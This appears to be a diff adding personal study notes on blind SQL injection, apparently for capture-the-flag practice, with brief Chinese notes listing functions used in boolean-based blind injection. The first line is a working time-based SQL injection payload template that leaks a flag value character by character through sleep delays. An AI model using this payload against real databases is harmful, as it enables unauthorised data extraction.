@@ -1,0 +1,12 @@
+11'+(select case when (substring((select flag from flag ) from {0} for 1 )='{1}') then sleep(4) else 1 end ) and '1'='1
+
+基于bool类型的盲注
+常用函数
+length()
+substr()
+ascii()
+sleep()
+if(expr1,expr2,expr3)::判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
+
+--------------------
+
